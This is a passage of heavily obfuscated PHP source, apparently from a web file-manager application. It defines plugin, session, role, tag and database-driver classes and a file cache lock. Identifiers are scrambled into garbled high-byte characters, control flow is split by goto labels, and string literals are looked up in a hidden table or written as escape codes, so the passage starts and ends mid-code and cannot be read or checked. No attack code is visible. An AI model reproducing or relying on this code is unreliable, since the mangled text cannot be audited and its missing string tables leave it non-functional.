$£“íó«); } parent::fileOutImage($¯úÛ©, $£“íó«); } public function fileOutLink($‚ñßõó¥) { $»¡Ïüë =& $_SERVER[å¸¿•¶£]; if (substr($‚ñßõó¥, 0, 7) == $»¡Ïüë[1344]) { $‚ñßõó¥ = $»¡Ïüë[1345] . substr($‚ñßõó¥, 7); } header($»¡Ïüë[161] . $‚ñßõó¥); die; } public function getHost() { $æòˆ¤ˆ =& $_SERVER[å¸¿•¶£]; $¾èú‹¥ = str_rtrim(parent::getHost(), $æòˆ¤ˆ[8] . $this->bucket); $¾èú‹¥ = explode($æòˆ¤ˆ[184], $¾èú‹¥); return $¾èú‹¥[0] . $æòˆ¤ˆ[184] . $this->bucket . $æòˆ¤ˆ[10] . $¾èú‹¥[1]; } } goto aíìğÑÇ—; fÆÃ‰³…‘Œ: define($_SERVER[å¸¿•¶£][241], 1); define($_SERVER[å¸¿•¶£][242], 0); define($_SERVER[å¸¿•¶£][243], 2); goto aÓÆôÊ¯±Ã; CºŒ¤¶°£Ç: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($ ÛÖ×Òà) { $¢ë¦šĞ– =& $_SERVER[å¸¿•¶£]; return array($¢ë¦šĞ–[1972] => array($ ÛÖ×Òà[0], $¢ë¦šĞ–[1973]), $¢ë¦šĞ–[1974] => array($ ÛÖ×Òà[0], $¢ë¦šĞ–[1975])); } protected function get($İ±ìÃ›) { $ÑõÑÅÍ‚ =& $_SERVER[å¸¿•¶£]; $ãâÓÑ¤ = Model($ÑõÑÅÍ‚[512])->metaGet($İ±ìÃ›, $ÑõÑÅÍ‚[1976]); $Ü—Ãíà = json_decode($ãâÓÑ¤, !0); return $Ü—Ãíà ? $Ü—Ãíà : array($ÑõÑÅÍ‚[1977] => $ÑõÑÅÍ‚[88], $ÑõÑÅÍ‚[369] => array()); } protected function set($´è˜¿×€, $»Óİá«á) { $ÍÄ•òïŠ =& $_SERVER[å¸¿•¶£]; $»Óİá«á = $»Óİá«á ? $»Óİá«á : array($ÍÄ•òïŠ[1977] => $ÍÄ•òïŠ[88], $ÍÄ•òïŠ[369] => array()); return Model($ÍÄ•òïŠ[512])->metaSet($´è˜¿×€, $ÍÄ•òïŠ[1976], json_encode($»Óİá«á)); } protected function getByTagID($Ç³ÇŒ„, $ì–ÃºŒ¸) { $·š¶ú˜¦ =& $_SERVER[å¸¿•¶£]; if (!$Ç³ÇŒ„ || !$ì–ÃºŒ¸) { return !1; } if (!Model($·š¶ú˜¦[512])->getInfoSimple($Ç³ÇŒ„)) { return !1; } $Ä’ÅúÃ³ = $this->get($Ç³ÇŒ„); if (!$Ä’ÅúÃ³ || !isset($Ä’ÅúÃ³[$·š¶ú˜¦[369]])) { return !1; } $²ı€É‰ = array_find_by_field($Ä’ÅúÃ³[$·š¶ú˜¦[369]], $·š¶ú˜¦[399], $ì–ÃºŒ¸); return is_array($²ı€É‰) ? $²ı€É‰ : !1; } public function listSource($æº‰¬·ü, $Á»Óè¬•) { $ÈÇ‹ • =& $_SERVER[å¸¿•¶£]; if ($Á»Óè¬• && !is_array($Á»Óè¬•)) { $Á»Óè¬• = array($Á»Óè¬•); } $œ¦íË³Ê = $this->listData($æº‰¬·ü); $Á¤–ÙõÖ = array(); foreach ($œ¦íË³Ê as $õÒòâàê) { $Î‚úº“ = $õÒòâàê[$ÈÇ‹ •[84]]; if (!$Î‚úº“) { continue; } if (!isset($Á¤–ÙõÖ[$Î‚úº“])) { $Á¤–ÙõÖ[$Î‚úº“] = array(); } $Á¤–ÙõÖ[$Î‚úº“][] = $õÒòâàê[$ÈÇ‹ •[426]]; } $Ï˜›Í´¡ = array(); foreach ($Á¤–ÙõÖ as $çÒñö’ñ => $ë€½ôÏ) { $ßÉ¨Òª = !0; if (!$Á»Óè¬•) { $Ï˜›Í´¡[] = $çÒñö’ñ; continue; } foreach ($Á»Óè¬• as $ Éºç¿“) { if (!in_array($ Éºç¿“, $ë€½ôÏ)) { $ßÉ¨Òª = !1; break; } } if ($ßÉ¨Òª) { $Ï˜›Í´¡[] = $çÒñö’ñ; } } if (!$Ï˜›Í´¡) { return array(); } $æâî‡ÑÂ = array($ÈÇ‹ •[417] => array($ÈÇ‹ •[418], $Ï˜›Í´¡), $ÈÇ‹ •[496] => $æº‰¬·ü, $ÈÇ‹ •[411] => SourceModel::TYPE_GROUP); $ï¥šÛİï = Model($ÈÇ‹ •[1346])->listSource($æâî‡ÑÂ); if (!$ï¥šÛİï || count($Ï˜›Í´¡) == $ï¥šÛİï[$ÈÇ‹ •[366]][$ÈÇ‹ •[367]]) { return $ï¥šÛİï; } $ë¬ÏíÌà = array(); $¢ã½ÒÆ = array_to_keyvalue($ï¥šÛİï[$ÈÇ‹ •[82]], $ÈÇ‹ •[12], $ÈÇ‹ •[402]); $­êûÇÂÆ = array_to_keyvalue($ï¥šÛİï[$ÈÇ‹ •[83]], $ÈÇ‹ •[12], $ÈÇ‹ •[402]); $ç¬‰¾¦ = array_merge($­êûÇÂÆ, $¢ã½ÒÆ); foreach ($Ï˜›Í´¡ as $Î‚úº“) { if (!in_array($Î‚úº“, $ç¬‰¾¦)) { $ë¬ÏíÌà[] = $Î‚úº“; } } if ($ë¬ÏíÌà) { $this->removeBySource($æº‰¬·ü, $ë¬ÏíÌà); } return $ï¥šÛİï; } protected function listData($³ÜõüÅ) { $®ŒÈëÃ =& $_SERVER[å¸¿•¶£]; $Ô€®Å = array($®ŒÈëÃ[1665] => 0, $®ŒÈëÃ[483] => array($®ŒÈëÃ[1978], 0), $®ŒÈëÃ[422] => $®ŒÈëÃ[1979] . $³ÜõüÅ); $–™–±¿Â = $®ŒÈëÃ[1980]; $’“Æ‡Ö = $this->field($–™–±¿Â)->where($Ô€®Å)->order($®ŒÈëÃ[1981])->select(); return $’“Æ‡Ö ? $’“Æ‡Ö : array(); } protected function addToTag($ÕîªÇôî, $Ø¥»ÚÚÏ, $µ‡„åÂÇ) { $…ó­Á ¶ =& $_SERVER[å¸¿•¶£]; if (!$this->getByTagID($ÕîªÇôî, $µ‡„åÂÇ) || !$Ø¥»ÚÚÏ) { return !1; } if (!Model($…ó­Á ¶[832])->pathInfo($Ø¥»ÚÚÏ)) { return !1; } $Ø®šÉñ = array($…ó­Á ¶[1665] => 0, $…ó­Á ¶[483] => $µ‡„åÂÇ, $…ó­Á ¶[421] => $Ø¥»ÚÚÏ, $…ó­Á ¶[422] => $…ó­Á ¶[1982] . $ÕîªÇôî, $…ó­Á ¶[420] => $…ó­Á ¶[12], $…ó­Á ¶[1867] => 0); if ($this->where($Ø®šÉñ)->find()) { return !1; } return $this->add($Ø®šÉñ); } protected function removeFromTag($¯áÚä¡, $İäÓÂŠÍ, $¹…ó¸÷Œ) { $‡ûˆéœ =& $_SERVER[å¸¿•¶£]; if (!$this->getByTagID($¯áÚä¡, $¹…ó¸÷Œ) || !$İäÓÂŠÍ) { return !1; } if (is_array($İäÓÂŠÍ)) { $İäÓÂŠÍ = array($‡ûˆéœ[7], $İäÓÂŠÍ); } $Á¹“»½î = array($‡ûˆéœ[1665] => 0, $‡ûˆéœ[483] => $¹…ó¸÷Œ, $‡ûˆéœ[422] => $‡ûˆéœ[1982] . $¯áÚä¡, $‡ûˆéœ[421] => $İäÓÂŠÍ); return $this->where($Á¹“»½î)->delete(); } protected function removeByTag($³Óøò…ê, $·£•Äç) { $ë¤æé–¹ =& $_SERVER[å¸¿•¶£]; if (!$this->getByTagID($³Óøò…ê, $·£•Äç)) { return !1; } $æÒËÅı = array($ë¤æé–¹[1665] => 0, $ë¤æé–¹[483] => $·£•Äç, $ë¤æé–¹[422] => $ë¤æé–¹[1982] . $³Óøò…ê); return $this->where($æÒËÅı)->delete(); } protected function removeBySource($Š„’Õå¯, $âæ¶²øß) { $‘Ü‘›Ñ =& $_SERVER[å¸¿•¶£]; if (!$Š„’Õå¯ || !$âæ¶²øß) { return !1; } if (is_array($âæ¶²øß)) { $âæ¶²øß = array($‘Ü‘›Ñ[7], $âæ¶²øß); } $äŠ†Ñƒ˜ = array($‘Ü‘›Ñ[1665] => 0, $‘Ü‘›Ñ[421] => $âæ¶²øß, $‘Ü‘›Ñ[483] => array($‘Ü‘›Ñ[1021], 0), $‘Ü‘›Ñ[422] => $‘Ü‘›Ñ[1982] . $Š„’Õå¯); return $this->where($äŠ†Ñƒ˜)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\x70\154\165\x67\151\156\x4c\151\163\164"; public $field = array("\156\x61\x6d\145", "\x73\164\x61\164\165\163", "\162\145\147\x69\x65\163\x74", "\143\x6f\156\x66\x69\147"); public function loadList($é“Ğç… = false) { $˜Ş¶ÜÕ = array_to_keyvalue($this->listData(), $_SERVER[å¸¿•¶£][32]); if ($é“Ğç…) { return $˜Ş¶ÜÕ[$é“Ğç…]; } return $˜Ş¶ÜÕ; } public function init() { $üÌíí¿ğ =& $_SERVER[å¸¿•¶£]; Hook::trigger($üÌíí¿ğ[1983]); $·Ö›Ÿ«Û = $this->loadPluginList(); foreach ($·Ö›Ÿ«Û as $©ÚÍÓÌè => $¥ŸÕÓœ) { $Æ·å‹†Ä = $this->appAllow($©ÚÍÓÌè, $¥ŸÕÓœ); if (!$Æ·å‹†Ä) { continue; } foreach ($¥ŸÕÓœ[$üÌíí¿ğ[1984]] as $ªÃÜöÆé => $ŠÚ‡ò‹‚) { Hook::bind($ªÃÜöÆé, $ŠÚ‡ò‹‚); } } Hook::trigger($üÌíí¿ğ[1985]); Hook::trigger(ACTION); } public function appAllow($¨Í¸‰Àó, $Á§ÔíòÏ, $¬©„Ë™ = true) { $óŞ£˜Š =& $_SERVER[å¸¿•¶£]; $ÊÚ§îÕ = PLUGIN_DIR . $¨Í¸‰Àó . $óŞ£˜Š[1986]; if (!is_array($Á§ÔíòÏ) || !is_array($Á§ÔíòÏ[$óŞ£˜Š[1984]]) || $Á§ÔíòÏ[$óŞ£˜Š[756]] != 1 || !is_file($ÊÚ§îÕ)) { return !1; } if ($GLOBALS[$óŞ£˜Š[494]] == 1) { if ($GLOBALS[$óŞ£˜Š[6]][$óŞ£˜Š[1987]] || !$GLOBALS[$óŞ£˜Š[6]][$óŞ£˜Š[1988]]) { return !0; } $ØÑ¤ÎŞ‚ = explode($óŞ£˜Š[50], strtolower($GLOBALS[$óŞ£˜Š[6]][$óŞ£˜Š[1988]])); return in_array(strtolower($¨Í¸‰Àó), $ØÑ¤ÎŞ‚) ? !1 : !0; } if ($¬©„Ë™ && !Action($óŞ£˜Š[1989])->checkAuth($¨Í¸‰Àó)) { return !1; } return !0; } public function unInstall($ããÁÄ) { $¤É‘×¸˜ =& $_SERVER[å¸¿•¶£]; $ºêÍ à‹ = $this->loadList($ããÁÄ); if (file_exists(PLUGIN_DIR . $ããÁÄ)) { Hook::apply($ããÁÄ . $¤É‘×¸˜[1990]); } $this->remove($ºêÍ à‹[$¤É‘×¸˜[399]]); } public function changeStatus($äÇèûº, $®º“¤®¥) { $˜Äö‹ê =& $_SERVER[å¸¿•¶£]; $ÅÏ“Â‰ = $this->loadList($äÇèûº); if ($®º“¤®¥) { Hook::apply($äÇèûº . $˜Äö‹ê[1991]); } $this->update($ÅÏ“Â‰[$˜Äö‹ê[399]], array($˜Äö‹ê[1992] => $®º“¤®¥)); } public function appRegist($Ãõç†œ, $ò×ŠáÉ) { $ş¥Õ„´ =& $_SERVER[å¸¿•¶£]; $Ù¹ÛøÖÛ = $this->loadList($Ãõç†œ); if ($Ù¹ÛøÖÛ) { $this->update($Ù¹ÛøÖÛ[$ş¥Õ„´[399]], array($ş¥Õ„´[1984] => $ò×ŠáÉ)); } else { $ÏÕş ‘È = array($ş¥Õ„´[32] => $Ãõç†œ, $ş¥Õ„´[1984] => $ò×ŠáÉ, $ş¥Õ„´[756] => 0, $ş¥Õ„´[6] => $this->getConfigDefault($Ãõç†œ)); $this->insert($ÏÕş ‘È); } } public function getConfigDefault($ç¢Ó¿úú) { $³Ãš¦Ëê =& $_SERVER[å¸¿•¶£]; $ñ¸Û…ï± = array(); $ßó‰¯”ü = $this->getPackageJson($ç¢Ó¿úú); if (!$ßó‰¯”ü && is_array($ßó‰¯”ü[$³Ãš¦Ëê[1993]])) { return $ñ¸Û…ï±; } foreach ($ßó‰¯”ü[$³Ãš¦Ëê[1993]] as $†°ç“À => $¦†ñ¤Š³) { if (!isset($¦†ñ¤Š³[$³Ãš¦Ëê[374]]) || isset($ñ¸Û…ï±[$†°ç“À])) { continue; } $ñ¸Û…ï±[$†°ç“À] = $¦†ñ¤Š³[$³Ãš¦Ëê[374]]; } return $ñ¸Û…ï±; } public function getPackageJson($¿ğÂú…Ö) { return Hook::apply($¿ğÂú…Ö . $_SERVER[å¸¿•¶£][1994]); } public function getConfig($Ùêıùù–, $¸Íò‚ô£ = false) { $â×Ñ½¤ö =& $_SERVER[å¸¿•¶£]; $ï°Æßşú = array(); $˜ĞËñ’İ = $this->loadList($Ùêıùù–); if ($˜ĞËñ’İ && is_array($˜ĞËñ’İ[$â×Ñ½¤ö[6]])) { $ï°Æßşú = $˜ĞËñ’İ[$â×Ñ½¤ö[6]]; } if (!$ï°Æßşú || $¸Íò‚ô£) { $ï°Æßşú = $this->getConfigDefault($Ùêıùù–); } return $ï°Æßşú; } public function setConfig($²øÁÑÎ†, $áÇíÂúò = false) { $‹à°”´Ÿ =& $_SERVER[å¸¿•¶£]; $ùØ˜ ¿‰ = $this->loadList($²øÁÑÎ†); if (!$ùØ˜ ¿‰) { return !1; } $æ’‡‚Í = $ùØ˜ ¿‰[$‹à°”´Ÿ[6]]; if ($áÇíÂúò == !1) { $æ’‡‚Í = array(); $áÇíÂúò = $this->getConfigDefault($²øÁÑÎ†); } foreach ($áÇíÂúò as $É¶ì…èÏ => $Ô›ªÊŸ«) { $æ’‡‚Í[$É¶ì…èÏ] = is_string($Ô›ªÊŸ«) ? trim($Ô›ªÊŸ«) : $Ô›ªÊŸ«; } $this->update($ùØ˜ ¿‰[$‹à°”´Ÿ[399]], array($‹à°”´Ÿ[6] => $æ’‡‚Í)); } public function viewList() { $ĞõÜâõÙ =& $_SERVER[å¸¿•¶£]; $©§’±™å = $this->loadList(); $this->pluginScan($©§’±™å); $©§’±™å = $this->loadPluginList(); $å‰Í÷æ = array(); foreach ($©§’±™å as $À­Ã©—£ => $•†‰ßØå) { unset($•†‰ßØå[$ĞõÜâõÙ[1984]], $•†‰ßØå[$ĞõÜâõÙ[6]]); $ïÇ„êŒ¹ = PLUGIN_DIR . $•†‰ßØå[$ĞõÜâõÙ[32]] . $ĞõÜâõÙ[1986]; if (!is_file($ïÇ„êŒ¹)) { continue; } $İèĞ˜¦Ë = Hook::apply($•†‰ßØå[$ĞõÜâõÙ[32]] . $ĞõÜâõÙ[1994]); if (is_array($İèĞ˜¦Ë)) { $å‰Í÷æ[$À­Ã©—£] = array_merge($•†‰ßØå, $İèĞ˜¦Ë); } } return $å‰Í÷æ; } private function loadPluginList() { $ÊæÅ“îˆ =& $_SERVER[å¸¿•¶£]; $– ºòÙô = $this->loadList(); if (strtolower(MOD) == $ÊæÅ“îˆ[1995]) { return $– ºòÙô; } $ûÁÚ‡éÄ = Hook::trigger($ÊæÅ“îˆ[1996], $– ºòÙô); if ($– ºòÙô && !$ûÁÚ‡éÄ) { die; } return $ûÁÚ‡éÄ ? $ûÁÚ‡éÄ : $– ºòÙô; } private function pluginScan($ÑñÖºïÄ) { $áÕÜÇ¶õ =& $_SERVER[å¸¿•¶£]; recursion_dir(PLUGIN_DIR, $ïóé½Û¿, $‹—âå¬š, 0); foreach ($ïóé½Û¿ as $Ã¼ö†ÑŸ) { $É°òØ² = get_path_this($Ã¼ö†ÑŸ); if (isset($ÑñÖºïÄ[$É°òØ²]) || !file_exists($Ã¼ö†ÑŸ . $áÕÜÇ¶õ[1997]) || !file_exists($Ã¼ö†ÑŸ . $áÕÜÇ¶õ[1986])) { continue; } Hook::apply($É°òØ² . $áÕÜÇ¶õ[1991]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\x65\x6d\x5f\x73\x65\163\x73\x69\x6f\x6e"; public function get($Ş©ªÂØ©) { $¬èÔ÷ê =& $_SERVER[å¸¿•¶£]; $ Ûê«É­ = $this->where(array($¬èÔ÷ê[1998] => $Ş©ªÂØ©))->find(); if (!is_array($ Ûê«É­)) { return !1; } return $ Ûê«É­[$¬èÔ÷ê[761]]; } public function set($·½€ñ¼Ê, $ÀµÃø¼Æ, $í®Õ‘ = 3600) { $ÕÃà—Ú =& $_SERVER[å¸¿•¶£]; $ø¨µ™âñ = array($ÕÃà—Ú[1998] => $·½€ñ¼Ê, $ÕÃà—Ú[1902] => $ÀµÃø¼Æ, $ÕÃà—Ú[1999] => $í®Õ‘ + time()); if (Session::get($ÕÃà—Ú[2000])) { $ø¨µ™âñ[$ÕÃà—Ú[1674]] = Session::get($ÕÃà—Ú[2000]); } else { $ø¨µ™âñ[$ÕÃà—Ú[1674]] = 0; } if ($this->get($·½€ñ¼Ê)) { return $this->where(array($ÕÃà—Ú[1998] => $·½€ñ¼Ê))->save($ø¨µ™âñ); } else { return $this->add($ø¨µ™âñ, array(), !0); } } public function remove($ô¦ÍşÖ©) { return $this->where(array($_SERVER[å¸¿•¶£][1998] => $ô¦ÍşÖ©))->delete(); } public function clearTimeout() { return $this->where($_SERVER[å¸¿•¶£][2001] . time())->delete(); } } goto Fªˆ‡¤ç”Ü; B½º‹ÏŒ ¬: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\145\x6d\137\157\x70\x74\x69\x6f\156"; protected $jsonField = array("\x6d\145\x6e\x75", "\162\157\x6c\x65", "\162\x6f\x6c\x65\107\162\x6f\165\160", "\x72\x65\147\151\163\164", "\145\155\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($Ç±•ó¹Œ) { return "\123\x79\x73\x74\x65\155\x4f\160\164\151\x6f\156\x5f{$Ç±•ó¹Œ}"; } protected function optionDefault($ÖûîÜ§É = '') { $Ê‚ãùØÍ =& $_SERVER[å¸¿•¶£]; if ($ÖûîÜ§É == $Ê‚ãùØÍ[12]) { return $GLOBALS[$Ê‚ãùØÍ[6]][$Ê‚ãùØÍ[381]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\x2e\162\x6f\x6c\x65\x4c\x69\163\x74"; public $field = array("\156\x61\155\145", "\x61\x75\164\x68", "\154\x61\142\145\154", "\x64\151\163\160\154\141\171", "\163\171\x73\164\x65\x6d", "\x64\x65\x73\143", "\x69\x67\156\157\162\x65\105\170\164", "\151\147\x6e\x6f\x72\x65\x46\x69\x6c\145\123\151\172\x65", "\x61\x64\x6d\151\156\x69\x73\x74\162\x61\164\157\x72", "\x73\157\x72\x74"); public function listData($Ÿ™Û§ƒ• = false, $—Îú‘‡â = "\163\x6f\x72\164", $ı¥¨ü€¨ = false) { $òÛû«öŞ =& $_SERVER[å¸¿•¶£]; $¢şîõÇ = parent::listData($Ÿ™Û§ƒ•, $—Îú‘‡â, $ı¥¨ü€¨); if (!$Ÿ™Û§ƒ•) { foreach ($¢şîõÇ as $ÎÓœ€ƒ => $‹¡ßÅ¸à) { if ($‹¡ßÅ¸à[$òÛû«öŞ[2065]] == 1) { $¢şîõÇ[$ÎÓœ€ƒ][$òÛû«öŞ[453]] = LNG($òÛû«öŞ[2299]); } } } return $¢şîõÇ; } public function update($©¤øÓòÚ, $‡ÉÚŸ„“) { $¡Ï‘Ë¸ó =& $_SERVER[å¸¿•¶£]; $éá¹úè± = parent::listData($©¤øÓòÚ); $š¿³–½á = $this->findByName($‡ÉÚŸ„“[$¡Ï‘Ë¸ó[32]]); if (!$éá¹úè± || $š¿³–½á && $š¿³–½á[$¡Ï‘Ë¸ó[399]] != $éá¹úè±[$¡Ï‘Ë¸ó[399]]) { return !1; } if ($š¿³–½á[$¡Ï‘Ë¸ó[2065]] == 1) { $‡ÉÚŸ„“ = array($¡Ï‘Ë¸ó[32] => $‡ÉÚŸ„“[$¡Ï‘Ë¸ó[32]], $¡Ï‘Ë¸ó[1886] => $‡ÉÚŸ„“[$¡Ï‘Ë¸ó[1886]]); } $this->filterAuth($‡ÉÚŸ„“[$¡Ï‘Ë¸ó[413]]); return parent::update($©¤øÓòÚ, $‡ÉÚŸ„“); } public function remove($âÜ‡ïåì) { $‰èïÖ’ö = parent::listData($âÜ‡ïåì); if (!$‰èïÖ’ö || $‰èïÖ’ö[$_SERVER[å¸¿•¶£][1291]]) { return !1; } return parent::remove($âÜ‡ïåì); } public function add($¿—Îªß×) { $ñÆ¹èíÖ =& $_SERVER[å¸¿•¶£]; $‰ñ’î = $¿—Îªß×[$ñÆ¹èíÖ[32]]; if ($this->findByName($‰ñ’î)) { return !1; } $ÛàÒÈë÷ = array($ñÆ¹èíÖ[420] => $‰ñ’î, $ñÆ¹èíÖ[1869] => $ñÆ¹èíÖ[12], $ñÆ¹èíÖ[1865] => $ñÆ¹èíÖ[1873], $ñÆ¹èíÖ[2300] => 1, $ñÆ¹èíÖ[1868] => 0, $ñÆ¹èíÖ[2301] => 0, $ñÆ¹èíÖ[1867] => $this->getSort()); $¿—Îªß× = array_merge($ÛàÒÈë÷, $¿—Îªß×); $this->filterAuth($¿—Îªß×[$ñÆ¹èíÖ[413]]); return parent::insert($¿—Îªß×); } private function getSort() { $Áó€›¨ =& $_SERVER[å¸¿•¶£]; $Şğí™Ï = parent::listData(); $áŸ˜¨® = array_to_keyvalue($Şğí™Ï, $Áó€›¨[12], $Áó€›¨[1887]); return empty($áŸ˜¨®) ? 0 : max($áŸ˜¨®) + 1; } private function filterAuth(&$†ÉÚéÏ·) { $¦½´İŸ =& $_SERVER[å¸¿•¶£]; $ßéò‘úá = array(); $ÄÍª§¦’ = array_filter(explode($¦½´İŸ[50], $†ÉÚéÏ·)); foreach ($ÄÍª§¦’ as $†ÉÚéÏ·) { $²ææÙ½• = explode($¦½´İŸ[10], $†ÉÚéÏ·); if ($²ææÙ½•[0] == $¦½´İŸ[2302] && $²ææÙ½•[1] != $¦½´İŸ[1197]) { $ÌåäïŠÊ = $²ææÙ½•[0] . $¦½´İŸ[10] . $²ææÙ½•[1] . $¦½´İŸ[2303]; if (!in_array($ÌåäïŠÊ, $ÄÍª§¦’)) { $ßéò‘úá[] = $ÌåäïŠÊ; } } $ßéò‘úá[] = $†ÉÚéÏ·; } $†ÉÚéÏ· = implode($¦½´İŸ[50], $ßéò‘úá); } public function findRoleDefault() { $ªÁ©À† =& $_SERVER[å¸¿•¶£]; $ùÆŒ¯¬Û = parent::listData(); $·ˆ†¬İ = !1; foreach ($ùÆŒ¯¬Û as $¢óÉûü) { if (!$¢óÉûü || $¢óÉûü[$ªÁ©À†[1885]] == $ªÁ©À†[198] || $¢óÉûü[$ªÁ©À†[2065]] == 1) { continue; } if (strstr($¢óÉûü[$ªÁ©À†[413]], $ªÁ©À†[2304])) { continue; } if (!strstr($¢óÉûü[$ªÁ©À†[413]], $ªÁ©À†[2305])) { continue; } if (!$·ˆ†¬İ) { $·ˆ†¬İ = $¢óÉûü; continue; } $×Á®ô×Ç = explode($ªÁ©À†[50], $·ˆ†¬İ[$ªÁ©À†[413]]); $º…ù¸ãø = explode($ªÁ©À†[50], $¢óÉûü[$ªÁ©À†[413]]); if (count($×Á®ô×Ç) > count($º…ù¸ãø)) { $·ˆ†¬İ = $¢óÉûü; } } return $·ˆ†¬İ ? $·ˆ†¬İ[$ªÁ©À†[399]] : $ªÁ©À†[12]; } public function sort($Š†ˆ‚É«, $«ä›…ïı) { return parent::update($Š†ˆ‚É«, $«ä›…ïı); } } goto AôÉ ¸æ; BÖîˆ‘Ê…: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $¢ˆğï½ =& $_SERVER[å¸¿•¶£]; $çæâÂ· = $GLOBALS[$¢ˆğï½[6]][$¢ˆğï½[349]]; self::$cachePath = $çæâÂ·[$¢ˆğï½[200]][$¢ˆğï½[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Œä½ÂóÒ, $ñù˜ôÓ = 0) { $º² Íô± =& $_SERVER[å¸¿•¶£]; $§ıõµÌ = microtime(!0); $¦áÍÕÄÀ = $§ıõµÌ + $ñù˜ôÓ + 0.0001; $¦å†ª°Œ = rtrim(self::$cachePath, $º² Íô±[8]) . $º² Íô±[870] . md5($Œä½ÂóÒ) . $º² Íô±[867]; if (file_exists($¦å†ª°Œ) && filemtime($¦å†ª°Œ) && filemtime($¦å†ª°Œ) < time() - 10) { @unlink($¦å†ª°Œ); } do { if (file_exists($¦å†ª°Œ)) { cacheLockWait(); continue; } $ëÙëêò– = fopen($¦å†ª°Œ, $º² Íô±[871]); if (!$ëÙëêò–) { return !1; } $…Ÿ‰¤•‹ = flock($ëÙëêò–, LOCK_EX | LOCK_NB); self::$caches[$Œä½ÂóÒ] = array($º² Íô±[872] => $ëÙëêò–, $º² Íô±[200] => $¦å†ª°Œ); fwrite($ëÙëêò–, $¦áÍÕÄÀ); clearstatcache(); if ($ëÙëêò– && $…Ÿ‰¤•‹) { return !0; } cacheLockWait(); } while (microtime(!0) < $¦áÍÕÄÀ); $this->unlock($Œä½ÂóÒ); return !1; } public function lockGet($Ö‡šœ) { $ƒššóĞû =& $_SERVER[å¸¿•¶£]; $˜Í’ = rtrim(self::$cachePath, $ƒššóĞû[8]) . $ƒššóĞû[870] . md5($Ö‡šœ) . $ƒššóĞû[867]; return file_exists($˜Í’); } public function unlock($œ ·—¼§) { $†úö¦òŒ =& $_SERVER[å¸¿•¶£]; $í«ÔûÖÁ = self::$caches[$œ ·—¼§]; if (!$í«ÔûÖÁ) { return; } @flock($í«ÔûÖÁ[$†úö¦òŒ[872]], LOCK_UN); @fclose($í«ÔûÖÁ[$†úö¦òŒ[872]]); @unlink($í«ÔûÖÁ[$†úö¦òŒ[200]]); unset(self::$caches[$œ ·—¼§]); } } $_file = $_SERVER[$_SERVER[å¸¿•¶£][748]]; goto A‚Î‹½øó; a½°Õ¢Ø”³: function binCheckBigger($»ôÒö‹, $¥€‹ä) { return $»ôÒö‹ > $¥€‹ä; } $_SERVER[$_SERVER[ü»Éä¾][3]] = ("\70\62\61\66"."\x31\x37")+0;$_0b48="h0y1pcdw28xzsvfmtqi7lr3ukg4oea5jb9n68cs4tq7l5k9ewuiroh0yamxpf2g3vjb1dz6nr2bsjkfx";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($åîÚş˜±, $ª¦‹åü«) { $ÓìÖ† =& $_SERVER[å¸¿•¶£]; if (isset(self::$_methodList[$åîÚş˜±])) { return @call_user_func_array(self::$_methodList[$åîÚş˜±], $ª¦‹åü«); } else { if (method_exists($this, $åîÚş˜±)) { return call_user_func_array(array($this, $åîÚş˜±), $ª¦‹åü«); } else { think_exception(__CLASS__ . $ÓìÖ†[4] . $åîÚş˜± . $ÓìÖ†[5]); } } } public static function __callStatic($Ó‚Êµ»å, $¢½»·œö) { if (isset(self::$_methodListStatic[$Ó‚Êµ»å])) { return call_user_func_array(self::$_methodListStatic[$Ó‚Êµ»å], $¢½»·œö); } else { if (method_exists(self, $Ó‚Êµ»å)) { return call_user_func_array(array(self, $Ó‚Êµ»å), $¢½»·œö); } else { show_json("{$Ó‚Êµ»å}\x28\51\40\x6e\x6f\164\x20\x65\170\x69\163\x74\x3b", !1); } } } public static function addMethod($éÉİ½—ñ, $ÙààùÙÃ) { self::$_methodList[$éÉİ½—ñ] = $ÙààùÙÃ; } public static function addMethodStatic($‹Â…°¦, $Û»ÉÃñí) { self::$_methodListStatic[$‹Â…°¦] = $Û»ÉÃñí; } } goto D’ÕÖè‰Ã•; C†Û§¢’Ÿ£: class DbMysqli extends Db { public function __construct($ÒÍÀì£‡ = '') { $Œ²—„Ä’ =& $_SERVER[å¸¿•¶£]; if (!extension_loaded($Œ²—„Ä’[919])) { think_exception(think_lang($Œ²—„Ä’[14]) . $Œ²—„Ä’[920]); } if (!empty($ÒÍÀì£‡)) { $this->config = $ÒÍÀì£‡; if (empty($this->config[$Œ²—„Ä’[17]])) { $this->config[$Œ²—„Ä’[17]] = $Œ²—„Ä’[12]; } } } public function connect($¢Ÿ¾¡ºæ = '', $î£¤¤Åç = 0) { $¡¡÷ç˜› =& $_SERVER[å¸¿•¶£]; if (!isset($this->linkID[$î£¤¤Åç])) { if (empty($¢Ÿ¾¡ºæ)) { $¢Ÿ¾¡ºæ = $this->config; } $this->linkID[$î£¤¤Åç] = new mysqli($¢Ÿ¾¡ºæ[$¡¡÷ç˜›[893]], $¢Ÿ¾¡ºæ[$¡¡÷ç˜›[895]], $¢Ÿ¾¡ºæ[$¡¡÷ç˜›[896]], $¢Ÿ¾¡ºæ[$¡¡÷ç˜›[21]], $¢Ÿ¾¡ºæ[$¡¡÷ç˜›[894]] ? intval($¢Ÿ¾¡ºæ[$¡¡÷ç˜›[894]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $â…¨„Û = $this->linkID[$î£¤¤Åç]->server_version; $this->linkID[$î£¤¤Åç]->query($¡¡÷ç˜›[897] . think_config($¡¡÷ç˜›[898]) . $¡¡÷ç˜›[58]); if ($â…¨„Û > $¡¡÷ç˜›[899]) { $this->linkID[$î£¤¤Åç]->query($¡¡÷ç˜›[900]); } $this->connected = !0; if (1 != think_config($¡¡÷ç˜›[22])) { unset($this->config); } } return $this->linkID[$î£¤¤Åç]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($©é°øå) { 